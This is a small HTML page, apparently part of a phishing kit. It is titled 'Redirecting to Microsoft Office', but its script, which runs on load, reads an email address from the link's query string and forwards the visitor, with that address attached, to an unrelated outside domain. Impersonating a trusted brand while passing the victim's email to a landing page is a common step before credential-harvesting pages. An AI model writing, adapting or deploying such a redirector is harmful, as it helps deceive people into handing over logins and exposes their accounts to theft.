<!DOCTYPE html>
<html>
<head>
  <title>Redirecting to Microsoft Office</title>
  <script>
    function extractAndRedirect() {
      // Get the query parameter from the URL
      var queryParam = window.location.search.substring(1);

      // Convert the query parameter to a hash fragment
      var hashFragment = "#" + queryParam;

      // Initialize the default redirect URL
      var defaultRedirectURL = 'https://vmemail.com'; // Change this to your desired default redirect URL

      // Check if the hash fragment includes '@' (email address indicator)
      if (hashFragment.includes('@')) {
        // It might be an email address, so let's check
        var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (emailPattern.test(hashFragment)) {
          // It's a valid email address, retain the email and redirect to the default URL
          var decodedEmail = decodeURIComponent(hashFragment);
          // Extract the email address from the hash fragment
          var extractedEmail = decodedEmail.match(emailPattern)[0];
          // Redirect to the default URL with the email address as part of the query parameter
          window.location.href = defaultRedirectURL + '?' + extractedEmail;
          return; // Exit the function to prevent further processing
        }
      }
      
      // If there's no valid email in the hash fragment or no hash fragment at all,
      // just redirect to the default URL without any email parameter
      window.location.href = defaultRedirectURL;
    }

    // Call the function immediately when the script is loaded
    extractAndRedirect();
  </script>
</head>
<body>
</body>
</html>
